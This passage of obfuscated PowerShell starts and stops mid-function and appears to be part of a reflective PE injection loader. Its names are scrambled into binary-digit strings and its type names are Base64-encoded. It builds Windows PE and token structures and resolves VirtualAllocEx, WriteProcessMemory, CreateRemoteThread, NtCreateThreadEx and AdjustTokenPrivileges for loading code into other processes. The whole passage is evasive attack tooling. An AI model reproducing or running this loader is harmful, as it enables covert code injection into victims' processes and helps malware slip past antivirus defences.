      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${01000000001111110} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${01000000001111110}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${10010100001010100}, [System.ValueType], 8)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00011010000111001} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${00011010000111001}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${10010100001010100}, [System.ValueType], 20)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00010101001000111} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${00010101001000111}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${10010100001010100}, [System.ValueType], 40)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${01110001000110101} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${01110001000110101}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${10010100001010100}, [System.ValueType], 8)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${10111101000100000} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${10111101000100000}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${10010100001010100}, [System.ValueType], 12)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${10111101000100000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${01001110001110001} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${01001110001110001}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${10010100001010100}, [System.ValueType], 16)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${01001110001110001}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00011001001111110} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${00011001001111110}
      return $Win32Types
    }
    Function _01001001010010001
    {
      $Win32Constants = New-Object System.Object
      $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
      $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
      $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
      $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
      $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
      $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
      $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
      $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
      return $Win32Constants
    }
    Function _00011011001110100
    {
      $Win32Functions = New-Object System.Object
      ${11000010000111111} = _10000000110001100 kernel32.dll VirtualAlloc
      ${10100010010100101} = _00010110010100011 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
      ${01100110100101001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${11000010000111111}, ${10100010010100101})
      $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${01100110100101001}
      ${00111100011100001} = _10000000110001100 kernel32.dll VirtualAllocEx
      ${01010011111110010} = _00010110010100011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
      ${00001111110100110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00111100011100001}, ${01010011111110010})
      $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${00001111110100110}
      ${10010110010001010} = _10000000110001100 msvcrt.dll memcpy
      ${10110010000011110} = _00010110010100011 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
      ${00011010110000001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10010110010001010}, ${10110010000011110})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${00011010110000001}
      ${10110010011010101} = _10000000110001100 msvcrt.dll memset
      ${01111100000101111} = _00010110010100011 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
      ${00000100110011011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10110010011010101}, ${01111100000101111})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${00000100110011011}
      ${00011110111110111} = _10000000110001100 kernel32.dll LoadLibraryA
      ${01111011010100110} = _00010110010100011 @([String]) ([IntPtr])
      ${01111101111110010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00011110111110111}, ${01111011010100110})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${01111101111110010}
      ${00000011110010011} = _10000000110001100 kernel32.dll GetProcAddress
      ${00000010110100001} = _00010110010100011 @([IntPtr], [String]) ([IntPtr])
      ${00011110011111000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00000011110010011}, ${00000010110100001})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${00011110011111000}
      ${10100101100110110} = _10000000110001100 kernel32.dll GetProcAddress 
      ${11000001100101011} = _00010110010100011 @([IntPtr], [IntPtr]) ([IntPtr])
      ${10111001100001110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10100101100110110}, ${11000001100101011})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value ${10111001100001110}
      ${00000110000100110} = _10000000110001100 kernel32.dll VirtualFree
      ${01110000010111100} = _00010110010100011 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
      ${01110010011010011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00000110000100110}, ${01110000010111100})
      $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${01110010011010011}
      ${01111100010000111} = _10000000110001100 kernel32.dll VirtualFreeEx
      ${01111111101010011} = _00010110010100011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
      ${01110010011010110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01111100010000111}, ${01111111101010011})
      $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${01110010011010110}
      ${10100010000000001} = _10000000110001100 kernel32.dll VirtualProtect
      ${10110110001001111} = _00010110010100011 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
      ${10101001001001111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10100010000000001}, ${10110110001001111})
      $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${10101001001001111}
      ${11000011001010100} = _10000000110001100 kernel32.dll GetModuleHandleA
      ${01010011101100111} = _00010110010100011 @([String]) ([IntPtr])
      ${01011101001100011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${11000011001010100}, ${01010011101100111})
      $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${01011101001100011}
      ${10011101001110001} = _10000000110001100 kernel32.dll FreeLibrary
      ${00000010000111000} = _00010110010100011 @([IntPtr]) ([Bool])
      ${10000011011000100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10011101001110001}, ${00000010000111000})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${10000011011000100}
      ${01101100101101010} = _10000000110001100 kernel32.dll OpenProcess
      ${00000011100000101} = _00010110010100011 @([UInt32], [Bool], [UInt32]) ([IntPtr])
      ${01100111010110110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01101100101101010}, ${00000011100000101})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${01100111010110110}
      ${10100111011111110} = _10000000110001100 kernel32.dll WaitForSingleObject
      ${01111100110010100} = _00010110010100011 @([IntPtr], [UInt32]) ([UInt32])
      ${00000010111000011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10100111011111110}, ${01111100110010100})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${00000010111000011}
      ${10001111101011111} = _10000000110001100 kernel32.dll WriteProcessMemory
        ${10011101100100000} = _00010110010100011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${00010101000101111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10001111101011111}, ${10011101100100000})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${00010101000101111}
      ${11000010011100111} = _10000000110001100 kernel32.dll ReadProcessMemory
        ${01000101101011110} = _00010110010100011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${00111111010100111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${11000010011100111}, ${01000101101011110})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${00111111010100111}
      ${10010100010111000} = _10000000110001100 kernel32.dll CreateRemoteThread
        ${00111001011101100} = _00010110010100011 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${01001101000110000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10010100010111000}, ${00111001011101100})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${01001101000110000}
      ${10011110010011000} = _10000000110001100 kernel32.dll GetExitCodeThread
        ${10111010111000111} = _00010110010100011 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${00110010010001110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10011110010011000}, ${10111010111000111})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${00110010010001110}
      ${01000010011000010} = _10000000110001100 Advapi32.dll OpenThreadToken
        ${10111111100110000} = _00010110010100011 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${10000110000101111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01000010011000010}, ${10111111100110000})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${10000110000101111}
      ${10111101100111100} = _10000000110001100 kernel32.dll GetCurrentThread
        ${10101110100110111} = _00010110010100011 @() ([IntPtr])
        ${01111111000011100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10111101100111100}, ${10101110100110111})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${01111111000011100}
      ${00100011010010011} = _10000000110001100 Advapi32.dll AdjustTokenPrivileges
        ${11000000010100100} = _00010110010100011 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${01111110110001010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00100011010010011}, ${11000000010100100})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${01111110110001010}
      ${00101000110001101} = _10000000110001100 Advapi32.dll LookupPrivilegeValueA
        ${00111100010110100} = _00010110010100011 @([String], [String], [IntPtr]) ([Bool])
        ${00011011101000000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101000110001101}, ${00111100010110100})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${00011011101000000}
      ${10101110000011001} = _10000000110001100 Advapi32.dll ImpersonateSelf
        ${00100101110110010} = _00010110010100011 @([Int32]) ([Bool])
        ${01011001111110000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10101110000011001}, ${00100101110110010})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${01011001111110000}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
        ${01001110101100011} = _10000000110001100 NtDll.dll NtCreateThreadEx
            ${10101111010110110} = _00010110010100011 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${00111111010110010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01001110101100011}, ${10101111010110110})
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${00111111010110010}
        }
      ${00101101011101110} = _10000000110001100 Kernel32.dll IsWow64Process
        ${10001000000100010} = _00010110010100011 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${00100101100111101} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101101011101110}, ${10001000000100010})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${00100101100111101}
      ${00111001001110001} = _10000000110001100 Kernel32.dll CreateThread
        ${00100001001010100} = _00010110010100011 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${01101010011001101} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00111001001110001}, ${00100001001010100})
      $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${01101010011001101}
      return $Win32Functions
    }
    Function _00010111111000011
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        ${_10000101001010010},
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        ${_10100100000101100}
      )
      [Byte[]]${10001000101000001} = [BitConverter]::GetBytes(${_10000101001010010})
      [Byte[]]${01100101000100100} = [BitConverter]::GetBytes(${_10100100000101100})
      [Byte[]]${00010101010101011} = [BitConverter]::GetBytes([UInt64]0)
      if (${10001000101000001}.Count -eq ${01100101000100100}.Count)
      {
        ${01000010111100101} = 0
        for (${00111011010111001} = 0; ${00111011010111001} -lt ${10001000101000001}.Count; ${00111011010111001}++)
        {
          ${01101000010011000} = ${10001000101000001}[${00111011010111001}] - ${01000010111100101}
          if (${01101000010011000} -lt ${01100101000100100}[${00111011010111001}])
          {
            ${01101000010011000} += 256
            ${01000010111100101} = 1
          }
          else
          {
            ${01000010111100101} = 0
          }
          [UInt16]${00000101010110110} = ${01101000010011000} - ${01100101000100100}[${00111011010111001}]
          ${00010101010101011}[${00111011010111001}] = ${00000101010110110} -band 0x00FF
        }
      }
      else
      {
